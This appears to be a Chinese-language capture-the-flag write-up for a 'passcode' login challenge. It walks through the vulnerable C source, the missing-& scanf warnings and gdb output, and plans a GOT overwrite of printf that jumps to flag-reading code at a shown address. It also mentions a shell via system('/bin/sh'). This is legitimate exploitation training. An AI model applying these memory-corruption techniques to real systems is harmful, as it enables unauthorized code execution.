## 题目描述

 Mommy told me to make a passcode based login system. My initial C code was compiled without any error! Well, there was some compiler warning, but who cares about that?

## 题解

查看源代码

```c
#include <stdio.h>
#include <stdlib.h>
void login(){    
  int passcode1;    
  int passcode2;    
  printf("enter passcode1 : ");    
  scanf("%d", passcode1);    
  fflush(stdin);    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)  
  printf("enter passcode2 : ");    
  scanf("%d", passcode2);    
  printf("checking...\n");    
  if(passcode1==338150 && passcode2==13371337){        
    printf("Login OK!\n");        
    system("/bin/cat flag");    
  } else{        
    printf("Login Failed!\n");        
    exit(0);    
  }
}
void welcome(){    
  char name[100];   
  printf("enter you name : ");    
  scanf("%100s", name);    
  printf("Welcome %s!\n", name);
}
int main(){    
  printf("Toddler's Secure Login System 1.0 beta.\n");    
  welcome();    
  login();    // something after login...    
  printf("Now I can safely trust you that you have credential :)\n");    
  return 0;   
}
```

告诉我们注意下编译时的warning

```shell
gcc -m32 5.c -o 55.c: In function ‘login’:5.c:9:5: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]     scanf("%d", passcode1);     ^5.c:14:9: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]         scanf("%d", passcode2);
```

很明显的错误，使用scanf输入int类型的时候没有添加取地址符。但是，这只能说是一个bug，并不能说是漏洞。

scanf("%d", passcode1);

只要能控制passcode1的地址，就可以完成一个任意地址写。注意到login函数前面，有一个welcome函数，使用gdb调一下。

```shell
[----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0xf7fc3000 --> 0x1a6da8 ECX: 0x0 EDX: 0xf7fc4898 --> 0x0 ESI: 0x0 EDI: 0x0 EBP: 0xffffd668 --> 0xffffd688 --> 0x0 ESP: 0xffffd640 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")EIP: 0x80485b3 (<login+6>:  mov    DWORD PTR [esp],0x8048770)EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x80485ad <login>:   push   ebp   0x80485ae <login+1>: mov    ebp,esp   0x80485b0 <login+3>: sub    esp,0x28=> 0x80485b3 <login+6>: mov    DWORD PTR [esp],0x8048770   0x80485ba <login+13>:    call   0x8048420 <printf@plt>   0x80485bf <login+18>:    mov    eax,DWORD PTR [ebp-0x10]   0x80485c2 <login+21>:    mov    DWORD PTR [esp+0x4],eax   0x80485c6 <login+25>:    mov    DWORD PTR [esp],0x8048783[------------------------------------stack-------------------------------------]0000| 0xffffd640 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")0004| 0xffffd644 ("AA4AAJAAfAA5AAKAAgAA6AAL")0008| 0xffffd648 ("AJAAfAA5AAKAAgAA6AAL")0012| 0xffffd64c ("fAA5AAKAAgAA6AAL")0016| 0xffffd650 ("AAKAAgAA6AAL")0020| 0xffffd654 ("AgAA6AAL")0024| 0xffffd658 ("6AAL")0028| 0xffffd65c --> 0xb7a3f600 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, login () at 5.c:88       printf("enter passcode1 : ");gdb-peda$ x/wx $ebp-0x100xffffd658: 0x4c414136gdb-peda$ x/20wx $ebp-0x100xffffd658: 0x4c414136  0xb7a3f600  0x00000000  0x000000000xffffd668: 0xffffd688  0x080486c8  0x080487f0  0xf7ffd0000xffffd678: 0x080486eb  0xf7fc3000  0x080486e0  0x000000000xffffd688: 0x00000000  0xf7e35ad3  0x00000001  0xffffd7240xffffd698: 0xffffd72c  0xf7feacca  0x00000001  0xffffd724gdb-peda$ pattern_offset 0x4c4141361279344950 found at offset: 96
```

可以看出welcome函数输入的第97-100个字节正好覆盖掉passcode1的地址，所以这就是一个任意地址写。但是程序有Canary，不过没关系，因为canary的第一个字节也是0x00。所以，剩下的思路就是GOT覆盖，覆盖printf的GOT表。可以选择用system覆盖，传入*/bin/sh*反弹一个shell。不过程序中已经有了读取flag的代码，直接用就可以了。

```shell
80485ce:   81 7d f4 c9 07 cc 00    cmpl   $0xcc07c9,-0xc(%ebp)80485d5:   75 1a                   jne    80485f1 <login+0x8d>80485d7:   c7 04 24 a5 87 04 08    movl   $0x80487a5,(%esp)80485de:   e8 6d fe ff ff          call   8048450 <puts@plt>80485e3:   c7 04 24 af 87 04 08    movl   $0x80487af,(%esp)80485ea:   e8 71 fe ff ff          call   8048460 <system@plt>80485ef:   c9                      leave  80485f0:   c3                      ret    80485f1:   c7 04 24 bd 87 04 08    movl   $0x80487bd,(%esp)80485f8:   e8 53 fe ff ff          call   8048450 <puts@plt>80485fd:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)8048604:   e8 77 fe ff ff          call   8048480 <exit@plt>
```

读flag代码的地址为*0x80485e3i*。